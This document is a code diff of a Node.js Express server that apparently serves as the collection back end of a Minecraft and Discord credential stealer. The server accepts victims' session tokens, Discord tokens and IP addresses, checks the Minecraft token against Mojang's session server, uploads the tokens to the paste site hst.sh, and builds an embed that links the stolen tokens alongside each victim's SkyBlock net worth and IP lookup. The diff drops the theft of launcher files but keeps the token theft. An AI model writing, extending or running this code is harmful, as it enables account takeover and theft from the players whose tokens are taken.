@@ -22,7 +22,7 @@ setInterval(() => {
 }, 1000 * 60 * 15);
 
 app.post("/", async (req, res) => {
-    const requiredFields = ["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "tlauncher", "tllegacy", "discord"];
+    const requiredFields = ["username", "uuid", "token", "ip", "discord"];
     if (!requiredFields.every(field => req.body.hasOwnProperty(field))) {
         console.log(req.body);
         return res.sendStatus(404);
@@ -37,26 +37,21 @@ app.post("/", async (req, res) => {
     }
 
     try {
-        const [response, discordtoken, shorttoken, feather, essentials, lunar, tlauncher, tllegacy] = await Promise.all([
+        const [response, discordtoken, shorttoken] = await Promise.all([
             post("https://sessionserver.mojang.com/session/minecraft/join", {
                 accessToken: req.body.token,
                 selectedProfile: req.body.uuid,
                 serverId: req.body.uuid
             }),
             post("https://hst.sh/documents/", req.body.discord).then(res => res.data.key).catch(() => "Error uploading"),
-            post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
-            post("https://hst.sh/documents/", req.body.feather).then(res => res.data.key).catch(() => "Error uploading"),
-            post("https://hst.sh/documents/", req.body.essentials).then(res => res.data.key).catch(() => "Error uploading"),
-            post("https://hst.sh/documents/", req.body.lunar).then(res => res.data.key).catch(() => "Error uploading"),
-            post("https://hst.sh/documents/", req.body.tlauncher).then(res => res.data.key).catch(() => "Error uploading"),
-            post("https://hst.sh/documents/", req.body.tllegacy).then(res => res.data.key).catch(() => "Error uploading")
+            post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading")
         ]);
 
         let profiles = '';
         const profileData = await getProfiles(req.body.uuid);
         if (profileData) {
             for (let profileId in profileData.profiles) {
-                profiles += `${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`;
+                profiles += `${profileData.profiles[profileId].soulboundNetworth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`;
             }
         }
 
@@ -64,11 +59,6 @@ app.post("/", async (req, res) => {
 
         const checkToken = req.body.token == 'File not found :(' ? 'Invalid Token' : `[Minecraft Token](https://hst.sh/${shorttoken})`;
         const checkDiscord = req.body.discord == 'File not found :(' ? 'Invalid Token' : `[Discord Token](https://hst.sh/${discordtoken})`;
-        const checkFeather = req.body.feather == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${feather}) 🤩`;
-        const checkEssentials = req.body.essentials == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${essentials}) 🤩`;
-        const checkLunar = req.body.lunar == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${lunar}) 🤩`;
-        const checktlauncher = req.body.tlauncher == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${tlauncher}) 🤩`;
-        const checktllegacy = req.body.tllegacy == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${tllegacy}) 🤩`;
 
         const ipInfo = `[View](http://ipwho.is/${req.body.ip})`;
 
@@ -80,17 +70,12 @@ app.post("/", async (req, res) => {
                     { name: `Token`, value: `****${checkToken}****`, inline: true },
                     { name: 'Discord', value: `****${checkDiscord}****`, inline: true },
                     { name: 'Profiles', value: `\`\`\`${profiles}\`\`\`\`\`\`${country}\`\`\``, inline: false },
-                    { name: 'IP Info', value: `**${ipInfo}**`, inline: true },
-                    { name: 'Feather', value: `${checkFeather}`, inline: true },
-                    { name: 'Essentials', value: `${checkEssentials}`, inline: true },
-                    { name: 'Lunar', value: `${checkLunar}`, inline: true },
-                    { name: 'Tlauncher', value: `${checktlauncher}`, inline: true },
-                    { name: 'TlLegacy', value: `${checktllegacy}`, inline: true },
+                    { name: 'IP Info', value: `**${ipInfo}**`, inline: true }
                 ],
                 url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                 color: 318521,
                 footer: {
-                    "text": "❤️USLESS❤️",
+                    "text": "❤️USELESS❤️",
                 },
                 timestamp: new Date()
             }],
